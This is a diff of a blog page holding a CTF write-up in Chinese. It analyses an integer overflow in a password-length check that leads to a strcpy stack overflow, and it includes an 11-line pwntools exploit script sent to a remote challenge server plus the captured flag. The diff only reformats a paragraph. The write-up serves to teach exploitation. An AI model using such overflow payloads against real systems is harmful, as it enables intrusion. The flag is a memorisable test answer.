@@ -310,7 +310,9 @@
 <h3 id="分析思路"><a href="#分析思路" class="headerlink" title="分析思路"></a>分析思路</h3><p>32位文件，按流程查看程序，main()无突破点。</p>
 <p>进入login(),限制username长度最大0x19;限制passwd长度最大0x199；</p>
 <p>进入check_passwd()，v3存储passwd长度，满足if语句3&lt;v3&lt;=8可跳到else语句。</p>
-<p><strong>此处有突破点：v3类型为unsigned __int8,，取值范围0~255，而v3存储的passwd最大为0x199,即409.远大于v3取值范围。此处为典型整数溢出。</strong></p>
+<blockquote>
+<p>此处有突破点：v3类型为unsigned __int8,，取值范围0~255，而v3存储的passwd最大为0x199,即409.远大于v3取值范围。此处为典型整数溢出。</p>
+</blockquote>
 <p>综上:if语句中的v3范围为（3,8]或[259,264] （最大为255，若使其溢出，则需再加四字节，__int8 是指8bit）</p>
 <p>溢出之后到达else语句，函数返回  strcpy(dest,s)，dest为字符串拷贝目的栈，长度为0x14。</p>
 <p><img src="https://i.loli.net/2020/05/08/7oCFMwki9HutVlr.png" alt="17627983-0f96bbadb310adc5.png"></p>
@@ -325,6 +327,7 @@
 <p><img src="https://i.loli.net/2020/05/08/c84MRnrbJZA1zFH.png" alt="捕获.PNG"></p>
 <p>exp:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">sh&#x3D;remote(&#39;111.198.29.45&#39;,39118)</span><br><span class="line">sh.recvuntil(&#39;Your choice:&#39;)</span><br><span class="line">flag&#x3D;0x0804868B</span><br><span class="line">sh.sendline(&#39;1&#39;)</span><br><span class="line">sh.recvuntil(&#39;username:&#39;)</span><br><span class="line">sh.sendline(&#39;z&#39;)</span><br><span class="line">sh.recvuntil(&#39;passwd:&#39;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x14+&#39;aaaa&#39;+p32(flag)+&#39;a&#39;*234</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
 <p>cyberpeace{2a2d92a084e034be9c3a03bbab4f149b}</p>
 
       
